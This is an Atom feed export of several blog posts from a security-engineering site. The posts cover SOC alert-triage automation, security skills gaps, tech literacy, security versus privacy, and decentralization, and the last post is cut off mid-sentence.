  <entry>
    <title type="html">🧱 Why Security Operations Can’t Scale Without Automation</title>
    <link href="https://www.securesql.info/2025/04/02/soc-challenges/" rel="alternate" type="text/html" title="🧱 Why Security Operations Can’t Scale Without Automation"/>
    <published>2025-04-02T00:00:00-07:00</published>
    <updated>2025-04-02T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2025/04/02/soc-challenges</id>
    <content type="html" xml:base="https://www.securesql.info/2025/04/02/soc-challenges/"><![CDATA[<p><strong>Overwhelmed SOCs are triaging 10,000+ alerts daily—most of which are false positives. The problem isn’t detection. It’s saturation.</strong></p>

<p>Security operations centers (SOCs) were never meant to scale like this. What began as centralized log review has ballooned into an arms race of dashboards, SIEM queries, and tier-1 analysts buried in alert queues. Meanwhile, attackers have automated everything from lateral movement to domain privilege escalation.</p>

<p>The defenders? Still writing detection rules by hand and responding to threats manually.</p>

<p>It’s no wonder SOC fatigue is real—and dangerous. But here’s the good news: we don’t need to scale humans linearly with threats. We need to <strong>rethink how detection and response works altogether with updated statistical methods.</strong></p>

<hr />

<h2 id="-the-broken-mental-model-rules-escalation-react">🧠 The Broken Mental Model: Rules, Escalation, React</h2>

<p>The traditional model is simple, but flawed:</p>

<ol>
  <li>Ingest logs</li>
  <li>Write detection rules</li>
  <li>Trigger alerts</li>
  <li>Escalate to humans</li>
  <li>Hope someone takes action</li>
</ol>

<p>This “firefighting” approach doesn’t scale. It burns out analysts, overlooks subtle signals, and rewards reactive posture over proactive control.</p>

<p>The more data we ingest, the more noise we generate. And the more rules we write, the more fragile the system becomes.</p>

<hr />

<h2 id="-a-better-way-autonomous-security-loops">🔁 A Better Way: Autonomous Security Loops</h2>

<p>Imagine this instead:</p>

<ol>
  <li>A new service emits logs—no schema? No problem.</li>
  <li>A statistical machine learning model based detection engine scores those events using an Energy-Based Model (EBM).</li>
  <li>High-risk behaviors trigger a playbook creation and playbook execution — not a person.</li>
  <li>That playbook takes action—containment, investigation, enrichment.</li>
  <li>The system tests itself. Refines itself. Improves itself.</li>
</ol>

<p>No tickets. No fatigue. Just a <strong>self-healing loop</strong> of detection, response, and optimization.</p>

<hr />

<h2 id="-real-world-insight">🔍 Real-World Insight</h2>

<p>In one pilot deployment of this system, a mid-sized SOC reduced its manual triage time by <strong>over 90% in 47 days</strong>. False positives dropped. Playbook efficiency rose. And tier-2 engineers finally had space to focus on <strong>real</strong> threats.</p>

<p>The secret wasn’t adding more alerts. It was cutting through the noise with intelligent, adaptable automation.</p>

<hr />

<h2 id="-from-firefighting-to-engineering">🔄 From Firefighting to Engineering</h2>

<p>You don’t need 10 more analysts. You need one good loop. And the confidence to let it evolve.</p>

<p>This isn’t about removing humans from security—it’s about <strong>freeing them from toil</strong> so they can operate at their best: asking questions, validating signals, and designing new defenses.</p>

<hr />

<h2 id="-your-move">🎯 Your Move</h2>

<p>Ask yourself:</p>
<ul>
  <li>Is your alert pipeline generating insight - or inertia?</li>
  <li>Are your analysts solving problems — or swimming through dashboards?</li>
</ul>

<p>If the answer stings, you’re not alone. But you’re not stuck.</p>

<p>👉 <strong>Explore how autonomous detection and response loops can transform your SOC.</strong> Read the full white paper or dive into the latest podcast episode to learn more.</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Energy-Based Models"/>
    <category term="AI-Driven Security"/>
    <category term="Security Operations Centers"/>
    <category term="Autonomous Threat Detection"/>
    <category term="SOC Automation"/>
    <category term="Cybersecurity AI"/>
    <category term="Alert Triage"/>
    <category term="False Positives Reduction"/>
    <category term="Security Engineering"/>
    <category term="Machine Learning in Security"/>
    <summary type="html"><![CDATA[Security operations centers were never meant to scale like this. What began as centralized log review has ballooned into an arms race of dashboards, SIEM queries, and tier-1 analysts buried in alert queues. Meanwhile, attackers have automated everything from lateral movement to domain privilege escalation.]]></summary>
  </entry>
  <entry>
    <title type="html">Embracing the Cyber Age- The Art of Adaptability in Security Engineering</title>
    <link href="https://www.securesql.info/2023/12/06/ethical-dilemmas-in-the-digital-age-balancing-security-and-privacy/" rel="alternate" type="text/html" title="Embracing the Cyber Age- The Art of Adaptability in Security Engineering"/>
    <published>2023-12-06T00:00:00-08:00</published>
    <updated>2023-12-06T00:00:00-08:00</updated>
    <id>https://www.securesql.info/2023/12/06/ethical-dilemmas-in-the-digital-age-balancing-security-and-privacy</id>
    <content type="html" xml:base="https://www.securesql.info/2023/12/06/ethical-dilemmas-in-the-digital-age-balancing-security-and-privacy/"><![CDATA[<p><img src="https://securesql.info/images/interesting.png.avif" alt="" /></p>

<h2 id="introduction-the-unceasing-evolution-of-cybersecurity-challenges"><strong>Introduction: The Unceasing Evolution of Cybersecurity Challenges</strong></h2>

<p>In the dynamic and ever-evolving realm of digital technology, the need for
adaptability in combating cyber threats has never been more pronounced. This
blog post delves into how Security Engineering must continuously evolve to
address the challenges posed by social media and other digital platforms. For
anyone navigating the digital world, from IT professionals to everyday
internet users, understanding the significance of this adaptability is crucial
for safeguarding against the myriad of cyber threats we face today.</p>

<h2 id="the-ever-changing-landscape-of-cyber-threats"><strong>The Ever-Changing Landscape of Cyber Threats</strong></h2>

<h3 id="the-role-of-social-media-in-shaping-cybersecurity"><strong>The Role of Social Media in Shaping Cybersecurity</strong></h3>

<p>Social media, with its vast reach and influence, has become a fertile ground
for new types of cyber threats. From misinformation campaigns to data
breaches, the challenges posed by these platforms are multifaceted and
continually evolving. Security Engineering must, therefore, be nimble and
innovative in its approach to protect users and systems effectively.</p>

<h3 id="the-evolving-nature-of-cyber-threats"><strong>The Evolving Nature of Cyber Threats</strong></h3>

<p>Cyber threats today are not what they were a decade, or even a year ago. They
have become more sophisticated, targeted, and damaging. Ransomware, phishing
attacks, and state-sponsored hacking are just the tip of the iceberg. Security
engineers must constantly update their knowledge and tactics to stay ahead of
these threats.</p>

<h2 id="the-imperative-of-adaptability-in-security-engineering"><strong>The Imperative of Adaptability in Security Engineering</strong></h2>

<h3 id="staying-ahead-of-threats"><strong>Staying Ahead of Threats</strong></h3>

<p>The key to effective cybersecurity is not just in responding to threats but in
anticipating them. This proactive approach involves continuous learning,
adopting new technologies, and thinking like an adversary to anticipate their
next move.</p>

<h3 id="implementing-cutting-edge-technologies"><strong>Implementing Cutting-Edge Technologies</strong></h3>

<p>Utilizing the latest technologies is crucial in this battle. AI and machine
learning, for example, can significantly enhance threat detection and response
times. Blockchain technology could revolutionize how we think about data
integrity and security.</p>

<h2 id="challenges-in-maintaining-adaptability"><strong>Challenges in Maintaining Adaptability</strong></h2>

<h3 id="the-skill-gap-in-cybersecurity"><strong>The Skill Gap in Cybersecurity</strong></h3>

<p>One of the significant challenges in staying adaptable is the skill gap in the
cybersecurity workforce. Keeping up with the rapid pace of technological
change requires ongoing education and training, which can be a resource-
intensive endeavor.</p>

<p>The skill gap in cybersecurity is a critical challenge that has grown in
parallel with the rapid evolution of technology and the sophistication of
cyber threats. Addressing this gap is essential for ensuring the effectiveness
and resilience of cybersecurity defenses. Here are some key aspects to
consider:</p>

<h3 id="1-rapid-technological-advancements">1. <strong>Rapid Technological Advancements</strong></h3>

<ul>
  <li>
    <p><strong>Evolving Threat Landscape</strong> : As new technologies emerge, so do new vulnerabilities and attack vectors. Cybersecurity professionals must continually update their skills to keep pace.</p>
  </li>
  <li>
    <p><strong>Specialized Knowledge Required</strong> : The complexity of modern cyber threats often requires specialized knowledge in areas such as cloud security, AI, or blockchain.</p>
  </li>
</ul>

<h3 id="2-education-and-training-challenges">2. <strong>Education and Training Challenges</strong></h3>

<ul>
  <li>
    <p><strong>Updating Curricula</strong> : Academic institutions must regularly update their curricula to reflect the current cyber threat landscape and the latest security technologies and practices.</p>
  </li>
  <li>
    <p><strong>Practical Skills and Hands-On Experience</strong> : Beyond theoretical knowledge, there is a growing need for practical skills. Simulated environments, internships, and real-world problem-solving experiences are crucial.</p>
  </li>
</ul>

<h3 id="3-industry-academia-collaboration">3. <strong>Industry-Academia Collaboration</strong></h3>

<ul>
  <li>
    <p><strong>Partnerships for Curriculum Development</strong> : Collaboration between the cybersecurity industry and academic institutions can ensure that education aligns with industry needs.</p>
  </li>
  <li>
    <p><strong>Guest Lectures and Workshops</strong> : Involvement of industry professionals in education through guest lectures and workshops can provide students with insights into real-world challenges.</p>
  </li>
</ul>

<h3 id="4-continuing-professional-development">4. <strong>Continuing Professional Development</strong></h3>

<ul>
  <li>
    <p><strong>Lifelong Learning</strong> : Cybersecurity is a field where continuous learning is necessary. Professionals should engage in ongoing training, certifications, and attending industry conferences.</p>
  </li>
  <li>
    <p><strong>Employer-Sponsored Training</strong> : Employers should invest in the continuous professional development of their cybersecurity staff.</p>
  </li>
</ul>

<h3 id="5-diversity-and-inclusion">5. <strong>Diversity and Inclusion</strong></h3>

<ul>
  <li>
    <p><strong>Broadening the Talent Pool</strong> : Encouraging diversity in cybersecurity can help address the skill gap by bringing in a wide range of perspectives and talents.</p>
  </li>
  <li>
    <p><strong>Inclusive Recruitment Strategies</strong> : Organizations should adopt more inclusive recruitment strategies to attract a diverse range of candidates.</p>
  </li>
</ul>

<h3 id="6-mentorship-and-leadership-development">6. <strong>Mentorship and Leadership Development</strong></h3>

<ul>
  <li>
    <p><strong>Mentorship Programs</strong> : Experienced professionals mentoring newcomers can accelerate skill development and transfer institutional knowledge.</p>
  </li>
  <li>
    <p><strong>Leadership Training</strong> : Developing leadership skills among cybersecurity professionals is crucial for effective team and project management.</p>
  </li>
</ul>

<h3 id="7-government-and-policy-maker-involvement">7. <strong>Government and Policy Maker Involvement</strong></h3>

<ul>
  <li>
    <p><strong>Funding and Incentives</strong> : Government initiatives can provide funding for cybersecurity education and training programs.</p>
  </li>
  <li>
    <p><strong>Public Awareness Campaigns</strong> : Increasing public awareness about cybersecurity can inspire more individuals to pursue careers in this field.</p>
  </li>
</ul>

<h3 id="8-certification-and-standardization">8. <strong>Certification and Standardization</strong></h3>

<ul>
  <li>
    <p><strong>Professional Certifications</strong> : Certifications can provide a standardized measure of skills and knowledge in various areas of cybersecurity.</p>
  </li>
  <li>
    <p><strong>Standardizing Skills Assessment</strong> : A standardized approach to assessing cybersecurity skills can help in clearly identifying skill gaps and areas for improvement.</p>
  </li>
</ul>

<h3 id="balancing-security-with-usability"><strong>Balancing Security with Usability</strong></h3>

<p>Balancing security with usability is a critical challenge in cybersecurity, as
overly complex security measures can detract from user experience and lead to
resistance or non-compliance. Effective security protocols need to be robust
enough to protect against threats while being user-friendly to ensure
widespread adoption and adherence. This balance is achieved through a
combination of user-centered design, education, and adaptive security
measures.</p>

<p>Firstly, user-centered design is paramount. Security systems must be developed
with the end-user in mind, ensuring that they are intuitive and do not require
extensive technical knowledge. This approach includes simplifying
authentication processes, employing clear and concise user interfaces, and
providing users with customizable security options. For example, multi-factor
authentication (MFA) can be made more user-friendly by offering a variety of
verification methods, such as biometrics or mobile device prompts, which are
both secure and convenient for the user.</p>

<p>Moreover, educating users on the importance of security measures and how to
use them effectively is crucial. When users understand the rationale behind
certain security protocols and how they protect their personal and
organizational data, they are more likely to comply. Regular training
sessions, user-friendly guides, and accessible support can demystify security
measures, leading to better engagement and compliance.</p>

<p>Finally, adaptive security measures that respond to the context of user
interaction can help strike a balance between security and usability. For
instance, systems can be designed to vary the level of security based on the
user’s location, device, or the type of data being accessed. This approach,
known as context-aware security, allows for more stringent measures in high-
risk scenarios while providing a more seamless experience in lower-risk
situations. By dynamically adjusting security requirements, organizations can
maintain high security standards without compromising on user experience.</p>

<h2 id="the-broader-implications-of-security-engineering-adaptability"><strong>The Broader Implications of Security Engineering Adaptability</strong></h2>

<h3 id="building-public-trust-in-digital-systems"><strong>Building Public Trust in Digital Systems</strong></h3>

<p>As security engineering adapts to combat emerging threats, it plays a crucial
role in building and maintaining public trust in digital systems. Users need
to feel confident that their data is safe and their interactions secure for
the digital economy to thrive.</p>

<h3 id="influencing-global-cybersecurity-trends"><strong>Influencing Global Cybersecurity Trends</strong></h3>

<p>The strategies and technologies implemented by security engineers play a
pivotal role in shaping global cybersecurity trends, influencing everything
from policy decisions to the overall trajectory of the tech industry. As these
professionals confront new challenges, their approaches often set precedents
that guide both private and public sector responses to cyber threats.</p>

<p>One significant way in which security engineers influence global trends is
through innovation in cybersecurity technologies. The development and adoption
of advanced tools, such as artificial intelligence (AI) for threat detection
or blockchain for secure transactions, not only provide immediate solutions
but also chart a course for future cybersecurity practices. These
technologies, once proven effective, can become industry standards, inspiring
wider adoption and potentially informing regulatory guidelines.</p>

<p>Moreover, security engineers’ responses to emerging threats often inform
policy and regulatory decisions. By demonstrating effective strategies for
combating new types of cyberattacks, such as those involving IoT devices or
cloud infrastructure, they provide a blueprint for lawmakers and regulators.
This guidance is crucial in developing comprehensive cybersecurity policies
that are both technically sound and pragmatically enforceable. For instance,
successful approaches to data privacy and breach response by leading tech
companies can influence the development of data protection regulations
globally.</p>

<p>Finally, the approach to cybersecurity taken by engineers and industry leaders
can shape the broader tech industry’s priorities and ethical standards. As
cybersecurity becomes an increasingly central concern, companies are motivated
to invest more in secure software development and to integrate security
considerations into all aspects of their operations. This shift not only
improves the security posture of individual organizations but also elevates
the importance of cybersecurity across the tech sector, leading to a more
security-conscious industry culture. By setting high standards for
cybersecurity, engineers not only protect against immediate threats but also
contribute to a safer and more resilient digital future.</p>

<h2 id="conclusion-embracing-change-for-a-secure-digital-future"><strong>Conclusion: Embracing Change for a Secure Digital Future</strong></h2>

<p>The adaptability of Security Engineering in the face of emerging cyber threats
is not just a technical necessity; it is a fundamental aspect of maintaining a
safe and secure digital environment. As we continue to witness the rapid
evolution of cyber threats, particularly in the realm of social media,
embracing change and staying ahead of these threats is essential. For everyone
navigating the digital space, from industry professionals to casual users,
understanding this dynamic is key to ensuring a secure digital future.</p>

<h3 id="essential-insights-for-security-engineers"><strong>Essential Insights for Security Engineers</strong></h3>

<ul>
  <li>
    <p><strong>Constant Vigilance</strong> : The landscape of cyber threats is continually evolving, necessitating constant vigilance and adaptability in security practices.</p>
  </li>
  <li>
    <p><strong>Proactive Measures</strong> : Anticipating threats and implementing cutting-edge technologies are crucial in effective cybersecurity.</p>
  </li>
  <li>
    <p><strong>Overcoming Challenges</strong> : Addressing the skill gap and balancing security with usability are essential for maintaining adaptability.</p>
  </li>
  <li>
    <p><strong>Building Trust</strong> : Adaptable security engineering is integral to building and maintaining public trust in digital systems and shaping global cybersecurity trends.</p>
  </li>
</ul>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Cybersecurity"/>
    <category term="Security Engineering"/>
    <category term="Adaptability"/>
    <category term="Cyber Threats"/>
    <category term="Social Media Security"/>
    <category term="AI in Cybersecurity"/>
    <category term="Blockchain Security"/>
    <category term="Proactive Cybersecurity"/>
    <category term="Security Usability"/>
    <category term="Cybersecurity Workforce"/>
    <category term="Digital Trust"/>
    <category term="Global Cybersecurity Trends"/>
    <summary type="html"><![CDATA[In the dynamic and ever-evolving realm of digital technology, the need for adaptability in combating cyber threats has never been more pronounced.]]></summary>
  </entry>
  <entry>
    <title type="html">Securing the Digital Frontier- The Essential Role of Education in Tech Literacy and Security Awareness</title>
    <link href="https://www.securesql.info/2023/11/27/the-pillars-of-digital-responsibility-understanding-the-crucial-role-of-tech-platforms-and-security-engineering/" rel="alternate" type="text/html" title="Securing the Digital Frontier- The Essential Role of Education in Tech Literacy and Security Awareness"/>
    <published>2023-11-27T00:00:00-08:00</published>
    <updated>2023-11-27T00:00:00-08:00</updated>
    <id>https://www.securesql.info/2023/11/27/the-pillars-of-digital-responsibility-understanding-the-crucial-role-of-tech-platforms-and-security-engineering</id>
    <content type="html" xml:base="https://www.securesql.info/2023/11/27/the-pillars-of-digital-responsibility-understanding-the-crucial-role-of-tech-platforms-and-security-engineering/"><![CDATA[<p><img src="https://securesql.info/images/DALL%C2%B7E+2023-11-15+15.48.42+-+A+conceptual+artwork+representing+the+theme+%27Securing+the+Digital+Frontier_+The+Essential+Role+of+Education+in+Tech+Literacy+and+Security+Awareness%27.+.png.avif" alt="" /></p>

<h2 id="introduction-why-your-digital-savvy-matters-more-than-ever"><strong>Introduction: Why Your Digital Savvy Matters More Than Ever</strong></h2>

<p>In the rapidly evolving digital landscape, where technology deeply permeates
every facet of our lives, the importance of tech literacy and security
awareness cannot be overstressed. This blog post delves into how education in
these areas is crucial, not only for personal security but for the broader
digital ecosystem. If you’re a user, a professional in tech, or simply someone
interested in the future of digital security, understanding this convergence
is key to navigating and fortifying the online world.</p>

<h2 id="understanding-the-link-between-tech-literacy-and-security-awareness"><strong>Understanding the Link Between Tech Literacy and Security Awareness</strong></h2>

<h3 id="the-growing-need-for-digital-know-how"><strong>The Growing Need for Digital Know-How</strong></h3>

<p>In an age dominated by digital interactions, tech literacy is no longer
optional; it’s a necessity. But tech literacy is more than just knowing how to
operate devices or use software; it involves understanding the principles that
govern digital technologies and how they impact our lives. This includes an
awareness of security risks and the practices needed to mitigate them, a core
tenet of security engineering.</p>

<h3 id="security-engineering-the-guardian-construction-worker-of-our-digital">**Security Engineering: The Guardian Construction Worker of Our Digital</h3>
<p>Realm**</p>

<p>Security engineering, a field dedicated to protecting digital systems from
threats, emphasizes the need for user awareness about security risks. It’s a
discipline that not only focuses on developing robust security systems but
also on educating users about the potential vulnerabilities and how their
actions can either strengthen or weaken digital security. For instance,
removing passwords schemes by adopting WebAuthN or Passkeys.</p>

<h2 id="the-importance-of-education-in-building-a-secure-digital-world"><strong>The Importance of Education in Building a Secure Digital World</strong></h2>

<h3 id="equipping-users-against-cyber-threats"><strong>Equipping Users Against Cyber Threats</strong></h3>

<p>In a world where cyber threats are ever-evolving, equipping users with the
knowledge to recognize and respond to these threats is critical. Security
engineering isn’t just a back-end operation; it’s a shared responsibility.
Users educated in basic security principles can act as the first line of
defense against cyberattacks as well as secure workflows with delightful
experiences for security invariants.</p>

<h3 id="media-literacy-a-pillar-of-digital-security"><strong>Media Literacy: A Pillar of Digital Security</strong></h3>

<p>Media literacy, an aspect highlighted in the speech, plays a pivotal role in
security. Understanding how to discern credible information, recognizing the
signs of phishing attempts, and knowing how personal data can be manipulated
are all skills that enhance overall digital security.</p>

<h2 id="challenges-and-opportunities-in-tech-literacy-and-security-education"><strong>Challenges and Opportunities in Tech Literacy and Security Education</strong></h2>

<h3 id="bridging-the-knowledge-gap"><strong>Bridging the Knowledge Gap</strong></h3>

<p>A significant challenge in this area is the knowledge gap. As technology
rapidly advances, keeping up with the latest security risks and practices can
be daunting for the average user. This creates a pressing need for accessible
and ongoing education in these areas.</p>

<h3 id="creating-engaging-and-effective-learning-experiences"><strong>Creating Engaging and Effective Learning Experiences</strong></h3>

<p>To effectively educate a diverse audience, learning experiences need to be
engaging, practical, and relevant. This could include interactive workshops,
online courses, and real-life scenarios that help users understand and apply
security principles in their daily digital interactions.</p>

<h2 id="the-societal-impact-of-educated-digital-citizens"><strong>The Societal Impact of Educated Digital Citizens</strong></h2>

<h3 id="empowering-users-to-protect-themselves-and-others"><strong>Empowering Users to Protect Themselves and Others</strong></h3>

<p>Educated users are empowered users. By understanding the basics of tech
literacy and security, individuals can make informed decisions, protect their
personal data, and contribute to a safer digital environment.</p>

<h3 id="fostering-a-culture-of-security"><strong>Fostering a Culture of Security</strong></h3>

<p>Education in tech literacy and security awareness fosters a culture of
security. When users are informed, they are more likely to adopt safe
practices, advocate for better security measures, and influence others to do
the same.</p>

<h2 id="conclusion-education-as-the-bedrock-of-digital-security"><strong>Conclusion: Education as the Bedrock of Digital Security</strong></h2>

<p>The intersection of tech literacy, media literacy, and security awareness,
underscored by the principles of security engineering, forms the bedrock of a
secure digital future. As technology continues to evolve and integrate deeper
into our lives, the importance of educating users in these areas becomes
increasingly critical. By fostering a well-informed and security-conscious
public, we not only protect individual users but also fortify the very
infrastructure of our digital world.</p>

<h3 id="essential-insights-for-security-engineers"><strong>Essential Insights for Security Engineers</strong></h3>

<ul>
  <li>
    <p><strong>Tech Literacy is Fundamental</strong> : Understanding the principles of technology and its impacts is crucial in today’s digital world.</p>
  </li>
  <li>
    <p><strong>User Awareness Strengthens Security</strong> : Educated users are essential in supporting the efforts of security engineering, acting as the first line of defense against cyber threats.</p>
  </li>
  <li>
    <p><strong>Media Literacy Enhances Security</strong> : Being able to discern credible information and recognize manipulation tactics is key to digital security.</p>
  </li>
  <li>
    <p><strong>Continuous Education is Key</strong> : As technology evolves, so must our understanding and practices around digital security and literacy.</p>
  </li>
</ul>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Cybersecurity"/>
    <category term="Tech Literacy"/>
    <category term="Security Awareness"/>
    <category term="Digital Security"/>
    <category term="Security Engineering"/>
    <category term="User Education"/>
    <category term="Media Literacy"/>
    <category term="Cyber Threats"/>
    <category term="Digital Ecosystem"/>
    <category term="Digital Citizenship"/>
    <category term="Continuous Education"/>
    <category term="Tech Awareness"/>
    <summary type="html"><![CDATA[In the rapidly evolving digital landscape, where technology deeply permeates every facet of our lives, the importance of tech literacy and security awareness cannot be overstressed.]]></summary>
  </entry>
  <entry>
    <title type="html">The Tightrope Walk- Balancing Security Engineering and Privacy in the Tech World</title>
    <link href="https://www.securesql.info/2023/11/23/building-trust-in-the-digital-age-the-crucial-role-of-security-engineering/" rel="alternate" type="text/html" title="The Tightrope Walk- Balancing Security Engineering and Privacy in the Tech World"/>
    <published>2023-11-23T00:00:00-08:00</published>
    <updated>2023-11-23T00:00:00-08:00</updated>
    <id>https://www.securesql.info/2023/11/23/building-trust-in-the-digital-age-the-crucial-role-of-security-engineering</id>
    <content type="html" xml:base="https://www.securesql.info/2023/11/23/building-trust-in-the-digital-age-the-crucial-role-of-security-engineering/"><![CDATA[<p><img src="https://securesql.info/images/DALL%C2%B7E+2023-11-15+15.35.20+-+A+conceptual+artwork+depicting+the+theme+%27The+Tightrope+Walk_+Balancing+Security+Engineering+and+Privacy+in+the+Tech+World%27.+The+image+features+a+lite.png.avif" alt="" /></p>

<h2 id="introduction-the-ethical-dilemma-at-the-heart-of-technology"><strong>Introduction: The Ethical Dilemma at the Heart of Technology</strong></h2>

<p>In the rapidly evolving world of technology, a critical and often
controversial issue stands at the forefront: the balance between robust
security measures and the protection of individual privacy rights. This blog
post dives into the ethical challenges faced in security engineering,
exploring the delicate equilibrium required in tech governance and privacy.
Understanding this balance is crucial for everyone in the digital age, from
security professionals to everyday users who entrust their personal data to
various technologies.</p>

<h2 id="the-core-challenge-security-vs-privacy"><strong>The Core Challenge: Security vs. Privacy</strong></h2>

<h3 id="the-need-for-robust-security"><strong>The Need for Robust Security</strong></h3>

<p>In an age where cyber threats loom large, the demand for stringent security
measures in technology is undeniable. Security engineering plays a pivotal
role in safeguarding data against breaches, protecting infrastructure from
attacks, and ensuring the integrity of our digital systems. This necessity for
high-level security often calls for extensive data collection and surveillance
practices.</p>

<h3 id="the-right-to-privacy"><strong>The Right to Privacy</strong></h3>

<p>However, this emphasis on security raises significant concerns regarding
individual privacy rights. The collection and analysis of personal data, while
essential for security purposes, can lead to potential misuse, privacy
breaches, and the erosion of trust. The question then arises: how do we
protect people in the digital realm while respecting their right to privacy?</p>

<h2 id="navigating-the-ethical-landscape"><strong>Navigating the Ethical Landscape</strong></h2>

<h3 id="developing-ethical-frameworks"><strong>Developing Ethical Frameworks</strong></h3>

<p>Sadly, there are not robust ethical frameworks in security engineering. Least
Privileges principle is not a framework. Adjacent in privacy engineering is a
simple, brittle framework called Privacy by Design. Addressing this challenge
requires the development of robust ethical frameworks in security engineering.
These frameworks should guide decision-making, ensuring that privacy concerns
are weighed alongside security, risk, &amp; business needs. Ethical guidelines
must consider the potential impacts of security measures on individual rights
and seek to minimize negative consequences.</p>

<h3 id="transparency-and-consent"><strong>Transparency and Consent</strong></h3>

<p>Key to this balance is transparency and consent. Users should be clearly
informed about what data is being collected, how it is used, and the measures
in place to protect their privacy. Obtaining explicit consent for data
collection and providing options for users to control their personal
information are essential steps in maintaining an ethical stance.</p>

<h2 id="the-societal-implications"><strong>The Societal Implications</strong></h2>

<h3 id="building-public-trust"><strong>Building Public Trust</strong></h3>

<p>The manner in which companies and organizations handle the balance between
security and privacy significantly impacts public trust. Transparent and
ethical practices can enhance trust in digital systems, while disregard for
privacy can lead to public backlash and loss of confidence. Yet one needs to
balance their security marketing transparent content with regulators like
Solarwinds found out - <a href="https://www.sec.gov/news/press-release/2023-227">https://www.sec.gov/news/press-release/2023-227</a> .</p>

<h3 id="shaping-policy-and-regulation"><strong>Shaping Policy and Regulation</strong></h3>

<p>The debate over security and privacy also influences policy and regulation in
the tech industry. Governments and regulatory bodies are increasingly focused
on developing laws and guidelines that protect individual privacy while
ensuring adequate security measures are in place.</p>

<h2 id="striking-the-right-balance-a-collaborative-effort"><strong>Striking the Right Balance: A Collaborative Effort</strong></h2>

<h3 id="involving-stakeholders"><strong>Involving Stakeholders</strong></h3>

<p>Achieving the right balance requires the involvement of various stakeholders -
security professionals, policymakers, stakeholders, ethicists, and end-users.
A collaborative approach ensures that diverse perspectives are considered,
leading to more nuanced and effective solutions.</p>

<h3 id="continuous-adaptation"><strong>Continuous Adaptation</strong></h3>

<p>The framework must be adaptability and malleable. The rapid pace of
technological change necessitates continuous adaptation in ethical practices.
What is considered a fair balance today may need reevaluation tomorrow, making
ongoing dialogue and reassessment critical.</p>

<h2 id="conclusion-the-ethical-path-forward"><strong>Conclusion: The Ethical Path Forward</strong></h2>

<p>The balance between robust security measures and the protection of individual
privacy rights is a complex but essential aspect of modern technology. As we
navigate this ethical tightrope, the responsibility falls on security
professionals, tech companies, stakeholders, policymakers, and users to
advocate for and implement practices that respect both security needs and
privacy rights. Only through a concerted and collaborative effort can we
create a digital landscape that is both secure and respectful of individual
privacy.</p>

<h3 id="essential-insights-for-security-engineers"><strong>Essential Insights for Security Engineers</strong></h3>

<ul>
  <li>
    <p><strong>Prioritize Ethical Decision-Making</strong> : Develop and adhere to robust ethical frameworks that balance security needs with privacy rights.</p>
  </li>
  <li>
    <p><strong>Emphasize Transparency and Consent</strong> : Ensure transparent practices in data collection and usage, and seek explicit consent from users.</p>
  </li>
  <li>
    <p><strong>Foster Public Trust</strong> : Build trust through ethical practices, enhancing confidence in digital systems and technologies.</p>
  </li>
  <li>
    <p><strong>Engage in Continuous Dialogue</strong> : Stay adaptive and responsive to technological changes, involving diverse stakeholders in ongoing discussions about security and privacy.</p>
  </li>
</ul>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Cybersecurity"/>
    <category term="Privacy Engineering"/>
    <category term="Ethical Frameworks"/>
    <category term="Security Engineering"/>
    <category term="Digital Trust"/>
    <category term="Transparency"/>
    <category term="Data Privacy"/>
    <category term="Security vs Privacy"/>
    <category term="Policy and Regulation"/>
    <category term="Public Trust"/>
    <category term="Collaborative Efforts"/>
    <summary type="html"><![CDATA[In the rapidly evolving world of technology, a critical and often controversial issue stands at the forefront the balance between robust security measures and the protection of individual privacy rights.]]></summary>
  </entry>
  <entry>
    <title type="html">Embracing Decentralization- The Future of Democratic Oversight and Security Engineering</title>
    <link href="https://www.securesql.info/2023/11/21/the-double-edged-sword-of-technology-balancing-innovation-and-risk-in-security-engineering/" rel="alternate" type="text/html" title="Embracing Decentralization- The Future of Democratic Oversight and Security Engineering"/>
    <published>2023-11-21T00:00:00-08:00</published>
    <updated>2023-11-21T00:00:00-08:00</updated>
    <id>https://www.securesql.info/2023/11/21/the-double-edged-sword-of-technology-balancing-innovation-and-risk-in-security-engineering</id>
    <content type="html" xml:base="https://www.securesql.info/2023/11/21/the-double-edged-sword-of-technology-balancing-innovation-and-risk-in-security-engineering/"><![CDATA[<p><img src="https://securesql.info/images/DALL%C2%B7E+2023-11-15+15.46.21+-+A+conceptual+artwork+depicting+%27Embracing+Decentralization_+The+Future+of+Democratic+Oversight+and+Security+Engineering%27.+The+image+combines+elements+.png.avif" alt="" /></p>

<h2 id="introduction-a-paradigm-shift-in-digital-trust"><strong>Introduction: A Paradigm Shift in Digital Trust</strong></h2>

<p>In an era where digital technology is not just a tool but a societal
cornerstone, the concepts of democratic oversight in technology and
decentralized security models in security engineering are more relevant than
ever. This blog post explores the intriguing parallel between these two ideas,
unraveling how the decentralization of trust and power in security engineering
mirrors the principles of democracy. As we delve into this topic, it’s
essential to understand why this shift is not just a technological evolution
but a reflection of our societal values.</p>

<h2 id="democratic-oversight-in-technology-a-call-for-collective-governance"><strong>Democratic Oversight in Technology: A Call for Collective Governance</strong></h2>

<p>In the realm of technology, democratic oversight represents the idea that
decisions, particularly those impacting the public, should not be left solely
in the hands of a few tech giants or government entities. Instead, there’s a
growing advocacy for more inclusive, transparent decision-making processes
that reflect the diverse needs and opinions of the broader community. This
shift is driven by concerns over privacy, data security, and the ethical use
of technology.</p>

<h2 id="decentralized-security-models-the-blockchain-revolution"><strong>Decentralized Security Models: The Blockchain Revolution</strong></h2>

<p>For example, parallel to the call for democratic oversight in technology is
the rise of decentralized security models in the field of security
engineering, most notably exemplified by blockchain technology. Blockchain
represents a seismic shift from traditional centralized security models. It
distributes data across a network of computers, making it nearly impossible to
transparently alter or hack. This decentralization of data storage and
management with the tamper-evident power of math effectively distributes trust
and power, resonating with the democratic ethos of shared governance and
transparency. Great since decentralized software aligns with security
principles like distributed trust. However, this model introduces new attack
surfaces that require specialized expertise in areas like cryptography and
game theory to address. These decentralized security models and ethos of open
access pose unique risks that must be balanced with benefits through emerging
best practices and standards.</p>

<h2 id="the-intersection-distributed-trust-and-power"><strong>The Intersection: Distributed Trust and Power</strong></h2>

<h3 id="breaking-down-centralized-control"><strong>Breaking Down Centralized Control</strong></h3>

<p>In both democratic oversight and decentralized security models, the underlying
principle is breaking down centralized control. Decentralized models, like
blockchain, distribute control across a network, ensuring no single entity has
overarching power or control. This is akin to democratic governance, where
